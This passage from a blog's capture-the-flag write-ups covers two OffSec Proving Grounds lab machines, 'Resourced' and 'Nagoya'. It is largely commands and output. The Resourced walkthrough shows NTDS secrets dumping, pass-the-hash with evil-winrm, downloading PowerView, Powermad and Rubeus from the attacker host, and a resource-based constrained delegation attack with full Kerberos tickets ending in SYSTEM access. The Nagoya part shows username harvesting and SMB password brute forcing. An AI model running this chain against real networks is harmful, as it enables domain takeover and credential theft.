httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open adws? syn-ack ttl 12549666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49674/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.049675/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49693/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49712/tcp open unknown syn-ack ttl 125Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 27200/tcp): CLEAN (Timeout)| Check 2 (port 39230/tcp): CLEAN (Timeout)| Check 3 (port 46712/udp): CLEAN (Timeout)| Check 4 (port 42734/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time: | date: 2024-06-20T07:19:19|_ start_date: N/A|_clock-skew: mean: 0s, deviation: 0s, median: 0s```{: .nolineno}## SMB Enumeration â¤µï¸I ran netexec but I don't get any access so I tried enum4linux Tool to get some informations ðŸ”»![Image](Pasted%20image%2020240620145406.png)_netexec Tool to check the default login_I got the Creds for user V.Ventz from here ðŸ”»![Image](Pasted%20image%2020240620145552.png)_enum4linux Tool users info_Lets check the SMB Share of this user ðŸ”½![Image](Pasted%20image%2020240620145950.png)_SMB Shares through netexec Tool_```bash/opt/Tools/secretsdump.py -system system -ntds ntds.dit local```{: .nolineno}![Image](Pasted%20image%2020240620151839.png)_Secretsdump.py Tool can also use impacket-secretsdump_I Pass the Hash over user L.Livingstone and got the shell.```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ evil-winrm -i 192.168.198.175 -u 'L.Livingstone' -H Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> whoamiresourced\\l.livingstone*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> hostnameResourceDC*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\L.Livingstone> tree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---Desktop| local.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\L.Livingstone>```{: .nolineno}For further privilege checks I used bloodhound and got GenericAll ACL Permission directly on DC machine.![Image](Pasted%20image%2020240621082558.png)_BloodHound Output_I Followed the Bloodhound GenericAll Abuse path from L.Livingstone user like this ðŸ”»```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ evil-winrm -i 192.168.156.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> curl http://192.168.45.157/Powermad.ps1 -o Powermad.ps1*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> curl http://192.168.45.157/PowerView.ps1 -o PowerView.ps1*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> curl http://192.168.45.157/Rubeus.exe -o Rubeus.exe*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> . .\\PowerView.ps1*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> . .\\Powermad.ps1*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> New-MachineAccount -MachineAccount SHIVA -Password $(ConvertTo-SecureString 'StrongShiv8' -AsPlainText -Force) -VerboseVerbose: [+] Domain Controller = ResourceDC.resourced.localVerbose: [+] Domain = resourced.localVerbose: [+] SAMAccountName = SHIVA$Verbose: [+] Distinguished Name = CN=SHIVA,CN=Computers,DC=resourced,DC=local[+] Machine account SHIVA added*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-537427935-490066102-1511301751-4101)\"*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> $SD.GetBinaryForm($SDBytes, 0)*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> Get-DomainComputer RESOURCEDC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -VerboseVerbose: [Get-DomainSearcher] search base: LDAP://DC=resourced,DC=localVerbose: [Get-DomainObject] Extracted domain 'resourced.local' from 'CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local'Verbose: [Get-DomainSearcher] search base: LDAP://DC=resourced,DC=localVerbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local)))Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 223 127 8 32 182 208 53 29 119 162 20 90 5 16 0 0' for object 'RESOURCEDC$'*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> Get-DomainComputer RESOURCEDC -Properties 'msds-allowedtoactonbehalfofotheridentity'msds-allowedtoactonbehalfofotheridentity----------------------------------------{1, 0, 4, 128...}*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> .\\Rubeus.exe s4u /user:SHIVA$ /rc4:3A9BB08C656640AC3DBF4F8038755264 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /ptt /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2[*] Action: S4U[*] Using rc4_hmac hash: 3A9BB08C656640AC3DBF4F8038755264[*] Building AS-REQ (w/ preauth) for: 'resourced.local\\SHIVA$'[*] Using domain controller: ::1:88[+] TGT request successful![*] base64(ticket.kirbi): doIFCDCCBQSgAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPcmVzb3VyY2VkLmxvY2Fso4IDyDCCA8SgAwIBEqEDAgECooIDtgSCA7Jrr3b0c/iALPD4kCtydeXzsohXORH5JsvdiKEVzC3BTQ3wLe68OBxc1ErKiMZBw8qLPHpvqxUYMNMj79K7jSQVCrnNb+rh67Z9HXRexCLJjGO+3ZWvKttIHilMrywZ+sObvKUHBPMbcK3uY7FWZT47FlWRQlVBxNYQnht7GgQeqcZea6DoHFLnyDqhYbEsobZu33KNNpyxaU6ytytJLWHd5blj1UeL7MeukfI0w0pbz6QtCkRxZMicH77rS3KtCo0mKyYU7cIJm+O03O3dAAktM84F2lnKIUxUcbTZ6VbnQg1kP6sx1Ux6TXw3+yGrAbSNopeWCMBfi0JZq+ldLo6bPU6YQPeJSkHX4S2jTt78nXt/2T/2qS3SeOwkbSg7uwOOCNbO+RSfzcnyjpL3RzqoS+ji8YwptpdUmO8WdT6Ou6NsjKDpjWS81PAic2hecH8Fir9fa/waHSKv4ew4x2hPS/nKbMtq5sjyL3/qzf/o1ax3qFTkPScNbDY8Lju4ixKr3FESj9Zgn3fOtEXERax5r0aAx+jDPXQ+aB5ymykbxDp8WjdgLz2gHIeU3RQISXiaN9wpRvB8EeR6ZDDD7wic204RZjCTPzTol92toPsihayDwqotxwurd1e25Em6Q979EJ85rHZvEruhNxh4sUG1n1S+x09KBqt6bblFpRuxjbKzybyKUOrPZD7FzPbBeoqaWdCOyEO/lXUy0fH+iIifjdlAV9q+215U3ZW33qP6RvQjxf3LsvwgB0JFQs6smsZ7T/M6OS2oktqD49kYhDJsanZj47+eBqQYZXeRplxAnSzrc7U0fXVlzMLqm1NGybm+qIMEb/G0g118/9B/HzPLY8bANiyYMbaiJVpABHgCR2vF5cYjQ+zsVNrXDLF4aUjSq9CDFx9HNPzh8R3dr8ZAZZhn/HlmiCh/6i2GU4ubSvoVWFfV5uazzn0fYbKDZ1GfPTT5jfcr0zCaQUb9raek2ntVBhPOgOkPtli9S1ZP8yMBH6k+S5JQz2n3u9oQjH+NZGYx+C7HxWi5tjNBsx3QfVMzwxmVkKTf5WJhvoBw6kjnaJFXsFdTD9xz8hwnon0cVkJGFfStClYCWzefvBHt0Q/2HxhTsRqZtXlo7xmbeJfkreFxvr6oMX8+KNbpiB8bv6wlcnx1B3zV+PreDBzpayuhDqgQlyCpgnwqpb9CE9fWOE+ZvaouW9OPhTVfCJQL9S5ZztRgL7oPYwOfemwbJ58wb/VYZNfoe/oVXityvpepo4HdMIHaoAMCAQCigdIEgc99gcwwgcmggcYwgcMwgcCgGzAZoAMCARehEgQQjPgQQ1Cfei55WJ4Fs0rTh6ERGw9SRVNPVVJDRUQuTE9DQUyiEzARoAMCAQGhCjAIGwZTSElWQSSjBwMFAEDhAAClERgPMjAyNDA2MjExMDU4MDZaphEYDzIwMjQwNjIxMjA1ODA2WqcRGA8yMDI0MDYyODEwNTgwNlqoERsPUkVTT1VSQ0VELkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9yZXNvdXJjZWQubG9jYWw=[*] Action: S4U[*] Building S4U2self request for: 'SHIVA$@RESOURCED.LOCAL'[*] Using domain controller: ResourceDC.resourced.local (::1)[*] Sending S4U2self request to ::1:88[+] S4U2self success![*] Got a TGS for 'administrator' to 'SHIVA$@RESOURCED.LOCAL'[*] base64(ticket.kirbi): doIFkDCCBYygAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKITMBGgAwIBAaEKMAgbBlNISVZBJKOCBGswggRnoAMCARehAwIBAaKCBFkEggRVm6USZ8MLn6JaAjBKhfbbJZG3df+jjjNhq7y84p8GmzJ5g+YtvcclvTHwQUsD3g+6aSWrIgOlWsU0DvtMd47REwQbhkuqas65a0UktUXHrx2lmB/sDx5zENwJ/dqkrdPmGeZeOHojIcJfZNJ7rCTRNdV+RykIulvGFrHbc5xIxXUgFc6zMD6y8ut9C5FadQCrwMYai8pE25hgFcu3/IlQc+Iu6C3mA/JqzsOPr/nnGep9R27wEXRziRyMktnT3F3TNSpzopjUY9YVOs3gfEBTM09be1Ak7Y/ncQtjZYx1X4gSxLzbfWztLgvSFtoAOF/NpA3OY2TSlxqQlZxpI79TMrKvSSv0ziS0d5WnMA6hv0BQFa2TPUQKZ44fTmhgtMDK+YHzBOXVEKQloEqfT7w2ag6v6ve8E14UxBeVyDnh0HSdQdHl33QKEFoHqGtJwVBOkRPt43QOTHwOJPYWT2qN8aP8X9U1tIllcFNvRBqrRkBau60zVb/hfqtg8GEhKyUV3Y4N8biaizv9O5F8m+gilkqmuqlnpGHW4GySKdvm/cMh38T7g7S1rL3ujp1axtjPc3j1DtdpBj1GkCGNaXovGL+s27lP7PLfg/SzDqOaljhZ1/YbBH4jLyjG1y4eh0IqYGXD4xwmFqx1iavvTv1XPqV267p+vOMxvTtmL8L6wzZsL1LJznhlBT46uwavUnFsG2EmDWNCQiCfteF5RZE6uqpA51ll4NOyKVDR5SEK/JgDnwUsXLbzGVbudkY+6TNSiOpesKhWBrm8yPxYzSDGQm2vN6lkTs99XbVL322T9OxX749ElX854Ms2lTL48bAO4EKxObi+k4PDEHu0ciTlz2Q5qiqhF2ZBkUUknoaVVvkwNM0ohCzHSkvkmEZhqgOzg0VmsaXo/NS+lIyaK5b0lljT4KlE8FMejk9MkOQ6J7PIgCsGOiYLj3oMev0qhqLmsrszL8uz3o8G8/F4XpoQUXBk6e5dF5r2rCC0R3H3rpP+eB/GUBHpQfbaAc4RBaAGHCCZbN51p1neBnu8Cb9HunmKjscOstOr5s8AwzV38yHs0ZkW5iCEoZNxE7xodEnqASwBFRqki0vLNO0vsDCzGN7YfqSt/FDJ25qTtVezUYIQFEJWM2+5xK6i4BUBJzfl2IscllUYk0pxWbeNSA+/zaHbf1uK6xhSTIbCaVTjStCRuVF3JHJO1xNjRB/lwcX+BxY0VQXHQMJwyrzIi8f+sRJ5lEgiCCErE2GAc89rKV2Nuvgi7xnRdoyu1gg4whlH0ZsjTmZK5Tq9h8oyJY7tRzBp6UJu+dkpuI8qID3euBcsnkdal6mxHvSGgMmDdqxFtAFIZegHjUhwL6QIWUJka8E2rjPi5TjVv3iPIK1ZNKeZo70S5W8UwZrj306CPr2WH+MEmY9ehGmz1RnOg6hB/+WKFHBXanDUNvDmO1ZlAyW61JC/a5G/mVf4lYWrQEGpIm0/adijgdMwgdCgAwIBAKKByASBxX2BwjCBv6CBvDCBuTCBtqAbMBmgAwIBF6ESBBDOYiA6OwO10/5YppNtU2cnoREbD1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNDA2MjExMDU4MDZaphEYDzIwMjQwNjIxMjA1ODA2WqcRGA8yMDI0MDYyODEwNTgwNlqoERsPUkVTT1VSQ0VELkxPQ0FMqRMwEaADAgEBoQowCBsGU0hJVkEk[*] Impersonating user 'administrator' to target SPN 'cifs/resourcedc.resourced.local'[*] Building S4U2proxy request for service: 'cifs/resourcedc.resourced.local'[*] Using domain controller: ResourceDC.resourced.local (::1)[*] Sending S4U2proxy request to domain controller ::1:88[+] S4U2proxy success![*] base64(ticket.kirbi) for SPN 'cifs/resourcedc.resourced.local': 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[+] Ticket successfully imported!*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents> klistCurrent LogonId is 0:0x19f80fCached Tickets: (1)#0>\tClient: administrator @ RESOURCED.LOCAL\tServer: cifs/resourcedc.resourced.local @ RESOURCED.LOCAL\tKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\tTicket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize\tStart Time: 6/21/2024 3:58:06 (local)\tEnd Time: 6/21/2024 13:58:06 (local)\tRenew Time: 6/28/2024 3:58:06 (local)\tSession Key Type: AES-128-CTS-HMAC-SHA1-96\tCache Flags: 0\tKdc Called:*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents>```{: .nolineno}This ticket is TGT ticket ðŸ”»![Image](Pasted%20image%2020240621094024.png)>[!info] Kindly note that there are 2 tickets that are generated 1st one is TGT and the 2nd one is TGS , To use it externally through Attacker machine from Tools like ( netexec , psexec ) you need to use the 2nd TGS ticket for more specific the **S4U2self** one and convert it to `.ccache` format .Now you got the TGS ticket as in base64 format so follow these steps to convert to its `.ccache` format ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ nano a.base64 # Here above you gona insert the base64 hash of TGT and save it. â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ cat a.base64| base64 -d > ticket1.kirbi # Above you have to convert the ticket into .kirbi format by decoding it from base64.â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ /opt/Tools/impacket/examples/ticketConverter.py ticket1.kirbi a.ccache Impacket v0.12.0.dev1 - Copyright 2023 Fortra[*] converting kirbi to ccache...[+] done# Conversion of .kirbi to .ccache it done now lets export the ticket into the environment variable in linux machine.â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ export KRB5CCNAME=`pwd`/a.ccache # exported the key into varaible name KRB5CCNAME .â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ psexec.py -k -no-pass resourced.local/Administrator@resourcedc.resourced.local -dc-ip 192.168.156.175Impacket v0.12.0.dev1 - Copyright 2023 Fortra[*] Requesting shares on resourcedc.resourced.local.....[*] Found writable share ADMIN$[*] Uploading file FRJSszGs.exe[*] Opening SVCManager on resourcedc.resourced.local.....[*] Creating service HlkX on resourcedc.resourced.local.....[*] Starting service HlkX.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.2145](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32> whoamint authority\\systemC:\\Windows\\system32> cd C:\\Users\\AdministratorC:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---3D Objects+---Contacts+---Desktop| proof.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator> type Desktop\\proof.txtb2893a22279ce164c298178ae7863f46C:\\Users\\Administrator> ```{: .nolineno}I am Administrator Now !> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Nagoya", "url": "/posts/Nagoya/", "categories": "Proving Grounds, Practice", "tags": "Active Directory, ASREPRoast, rpcclient, BloodHound, GenericAll, Silver_Ticket, MSSQL, chisel, Port Forwarding, SeImpersonatePrivilege, PrintSpoofer, Reverse_Engineering", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.155.21Nmap scan report for 192.168.155.21...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.155.21Nmap scan report for 192.168.155.21Host is up, received user-set (0.095s latency).Scanned at 2024-07-01 14:00:20 IST for 276sNot shown: 65512 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 125 Simple DNS Plus80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0|_http-title: Nagoya Industries - Nagoya|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-07-01 08:33:12Z)135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 125464/tcp open kpasswd5? syn-ack ttl 125593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack ttl 1253268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack ttl 1253389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services|_ssl-date: 2024-07-01T08:34:47+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: NAGOYA-IND| NetBIOS_Domain_Name: NAGOYA-IND| NetBIOS_Computer_Name: NAGOYA| DNS_Domain_Name: nagoya-industries.com| DNS_Computer_Name: nagoya.nagoya-industries.com| DNS_Tree_Name: nagoya-industries.com| Product_Version: 10.0.17763|_ System_Time: 2024-07-01T08:34:07+00:00| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com| Issuer: commonName=nagoya.nagoya-industries.com| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-03-22T06:01:24| Not valid after: 2024-09-21T06:01:24| MD5: f9dd:2ab0:e1e9:9370:d5a5:3d84:2e07:7cd8| SHA-1: c90e:90ed:2527:6e6f:d165:2fab:48b8:fde6:1dfc:5b2e| -----BEGIN CERTIFICATE-----| MIIC/DCCAeSgAwIBAgIQFOewLChVO7RI2WH88zxqHjANBgkqhkiG9w0BAQsFADAn| MSUwIwYDVQQDExxuYWdveWEubmFnb3lhLWluZHVzdHJpZXMuY29tMB4XDTI0MDMy| MjA2MDEyNFoXDTI0MDkyMTA2MDEyNFowJzElMCMGA1UEAxMcbmFnb3lhLm5hZ295| YS1pbmR1c3RyaWVzLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB| APWOyATxJmnX8GckLTsjBcr3Z6WymsDTtgA8i3/0ImOphNpYIefCyYl5YSfqtq/A| /WyZAyfOQPEeSAseCM2zByMF6Y3djZi0gi0dAn5nt6TCx+tQlBJfuQcSEBm7J6Ek| 0TuOKQUrUdy7WNyuT6WilOzQZ4QvgskB4WrXp6ckTJ5uFiYfXfVmjkcRNYQuzLxv| xWhDGvQQg9UAFglpQyeLS+O4kT4SVJPZb8OirW9Y74ZPd8RMaaSR+y4bnQrI2/ak| CdJlR3pwjfeQZAcaQLH2jYvjX/JazT9i1BkShKfsv/xhjjhBFrRezZbp5AcLLyxh| n678t7h09xR981dGgVuNYH0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAGTIqVXByfxI9E7YwZuhsc| mz/gG4jisKBqfEnTMb7KZtBXbPro8xgjglMOjZIn6Kt5VhwPPfTHSk9ykusKqkAm| MeDijJteUDc4T/FzUOezoECyg2VFBt50xzh1sLE7Yc5E39f3SUJPQ37El+8M2sFy| sUUNlo3YWUFKusB1NWZdrVLIrzcCzvXDUevEy88iWzRtgyl6dZudnb8orvidbybf| jTxS4MSEX996qXU4vK67gfSuI6dnQsE/SC+WmL0tQRlSQeP9m2WaBXWTjsa5mpyw| +56tJ9E+1whwNMZ//scGeywNOXt9AKdX3YqkvatfodJU69c8hOpCrYwwr7cNSypy|_-----END CERTIFICATE-----5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf syn-ack ttl 125 .NET Message Framing49666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49676/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49681/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49691/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49698/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49717/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPCService Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-07-01T08:34:09|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 47683/tcp): CLEAN (Timeout)| Check 2 (port 30881/tcp): CLEAN (Timeout)| Check 3 (port 3821/udp): CLEAN (Timeout)| Check 4 (port 23393/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: mean: 0s, deviation: 0s, median: 0s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and found this static site that contains a Team page with they have all the usernames listed ðŸ”»![Image](Pasted%20image%2020240702214143.png)_Dashboard of the site_Here is the list of members ðŸ”»![Image](Pasted%20image%2020240702214500.png)_Team members list_I arranged all the usernames in a filename that looks like this ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Nagoya]â””â”€$ cat user2.txt Matthew.HarrisonEmma.MiahRebecca.BellScott.GardnerTerry.EdwardsHolly.MatthewsAnne.JenkinsBrett.NaylorMelissa.MitchellCraig.CarrFiona.ClarkPatrick.Martin...```{: .nolineno}I looked for the username verification with kerbrute Tool with userenum .![Image](Pasted%20image%2020240702215102.png)_kerbrute Tool output_I got all the 28 usernames valid but could not found any users ASREPROAST users that have the TGT(Ticket Granting Ticket) tickets.So I bruteforce the SMB service the this usersname file and I used a password wordlist list with Tool netexec like this ðŸ”»![Image](Pasted%20image%2020240702215825.png)_SMB password bruteforce_I got this creds ðŸ”»```{: .nolineno}Fiona.Clark : Summer2023```{: .nolineno}Now as I got the credential of a user ,I have to see weather this creds can trigger any SPN (Service Principle Name) TGS (Ticket Granting Service) tickets ðŸ”»```bashpython3 /opt/Tools/impacket/examples/GetUserSPNs.py 